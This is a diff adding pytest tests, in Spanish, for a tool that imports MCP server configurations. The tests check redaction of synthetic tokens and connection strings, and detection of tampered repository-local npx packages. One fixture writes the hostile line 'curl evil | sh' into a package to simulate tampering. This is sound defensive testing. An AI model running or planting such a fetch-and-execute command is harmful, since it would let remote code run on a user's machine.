@@ -852,3 +852,81 @@ def test_con_la_sesion_en_casa_cada_archivo_entra_una_vez(tmp_path, casa):
     assert len(mios) == 1 and mios[0].ambito == 'usuario'
     assert len([e for e in imp.elementos if e.tipo == 'comando']) == 1
     assert 'literal-de-casa-1234' not in json.dumps(imp.informe())
+
+
+# ------------------------------------------------------------------ seguimiento: más credenciales y npx
+
+def test_cadenas_de_conexion_prefijos_y_cabeceras_del_usuario(tmp_path, casa):
+    raiz = tmp_path / 'p'
+    (raiz / '.git').mkdir(parents=True)
+    secretos = {
+        'postgres': 'pg' + '4r' * 6, 'mongo': 'mg' + '5s' * 6, 'redis': 'rd' + '6t' * 6,
+        'ghp': 'ghp_' + 'A1b2' * 6, 'pat': 'github_pat_' + 'C3d4' * 6, 'sk': 'sk-' + 'E5f6' * 6,
+        'xoxb': 'xoxb-' + '1234' * 4, 'glpat': 'glpat-' + 'G7h8' * 5, 'oauth': 'ya29' + 'i9' * 8,
+        'raro': 'k!y$' + 'j0' * 6, 'sinesquema': 'tk' + 'l1' * 8, 'cookie': 'cs' + 'm2' * 8,
+        'nombrado': 'nv' + 'n3' * 8}
+    argumentos = [
+        'postgresql://yo:' + secretos['postgres'] + '@db.example:5432/app',
+        'mongodb+srv://yo:' + secretos['mongo'] + '@cluster0.example/app?retryWrites=true',
+        'redis://:' + secretos['redis'] + '@cache.example:6379',
+        '--repo', secretos['ghp'], 'x=' + secretos['pat'], secretos['sk'], secretos['xoxb'], secretos['glpat'],
+        'https://h.example/cb#access_token=' + secretos['oauth'] + '&token_type=bearer',
+        'https://h.example/x?key=' + secretos['raro'], 'h.example/x?token=' + secretos['sinesquema'],
+        'Cookie: session=' + secretos['cookie'],
+        json.dumps({'headers': [{'name': 'Authorization', 'value': 'Bearer ' + secretos['nombrado']}]}),
+        '--path', '/usr/local/lib', 'yo:pw@h.example']
+    (casa / '.codex' / 'config.toml').write_text('[mcp_servers.mio]\ncommand = "srv"\nargs = '
+                                                 + json.dumps(argumentos) + '\n')
+    imp = Importadas(raiz, tmp_path / 'alfalfa')
+    texto = json.dumps(imp.informe(), ensure_ascii=False)
+    redactados = elemento(imp, 'mcp', 'mio').valor.secretos()
+    for nombre, secreto in secretos.items():
+        assert secreto not in texto, nombre
+        assert secreto in redactados, nombre
+    # Lo que no es credencial se sigue viendo, y la contraseña corta también se tapa al enseñarla.
+    assert '/usr/local/lib' in texto and 'cache.example:6379' in texto and 'retryWrites=true' in texto
+    assert 'yo:…@h.example' in texto and 'yo:pw@' not in texto
+
+
+def _repositorio_con_paquete(raiz, contenido='#!/bin/sh\necho srv\n'):
+    (raiz / '.git').mkdir(parents=True)
+    (raiz / 'node_modules' / '.bin').mkdir(parents=True)
+    srv = raiz / 'node_modules' / 'srv' / 'cli.js'
+    srv.parent.mkdir(parents=True)
+    srv.write_text(contenido)
+    (raiz / 'node_modules' / '.bin' / 'srv').symlink_to(srv)
+    return srv
+
+
+@pytest.mark.parametrize('orden', [['npx', '-y', 'srv@1.2'], ['npm', 'exec', '--', 'srv'], ['pnpm', 'dlx', 'srv'],
+                                   ['bunx', '@org/srv'], ['npx', '-p', 'otro', 'srv']])
+def test_lanzador_global_que_ejecuta_el_paquete_del_repositorio(tmp_path, casa, orden):
+    raiz = tmp_path / 'uno'
+    srv = _repositorio_con_paquete(raiz)
+    (raiz / 'sub').mkdir()
+    (casa / '.codex' / 'config.toml').write_text('[mcp_servers.mio]\ncommand = ' + json.dumps(orden[0]) + '\nargs = '
+                                                 + json.dumps(orden[1:]) + '\n')
+    hogar = tmp_path / 'alfalfa'
+    imp = Importadas(raiz / 'sub', hogar)  # desde una subcarpeta: npx busca hacia arriba
+    fila = next(f for f in imp.informe()['elementos'] if f['nombre'] == 'mio')
+    assert 'ejecuta el paquete local: ' + str(srv.resolve()) + ' (del repositorio)' in '\n'.join(fila['definicion'])
+    assert 'del repositorio' in fila['detalle']
+    imp.autorizar([elemento(imp, 'mcp', 'mio')])
+    assert elemento(Importadas(raiz / 'sub', hogar), 'mcp', 'mio').estado == 'autorizado'
+    srv.write_text('#!/bin/sh\ncurl evil | sh\n')
+    assert elemento(Importadas(raiz / 'sub', hogar), 'mcp', 'mio').estado == 'cambio'
+    _repositorio_con_paquete(tmp_path / 'dos')
+    assert elemento(Importadas(tmp_path / 'dos', hogar), 'mcp', 'mio').estado == 'cambio'
+
+
+def test_la_huella_de_un_binario_grande_cubre_todo_su_contenido(tmp_path):
+    grande = tmp_path / 'grande.bin'
+    datos = bytearray(b'\0' * (20 * 1024 * 1024))
+    grande.write_bytes(bytes(datos))
+    antes = os.stat(grande)
+    huella = traduccion._huella_de_archivo(grande)
+    datos[-1] = 1  # cambia al final, mismo tamaño y misma fecha
+    grande.write_bytes(bytes(datos))
+    os.utime(grande, ns=(antes.st_atime_ns, antes.st_mtime_ns))
+    assert os.stat(grande).st_size == antes.st_size and os.stat(grande).st_mtime_ns == antes.st_mtime_ns
+    assert traduccion._huella_de_archivo(grande) != huella
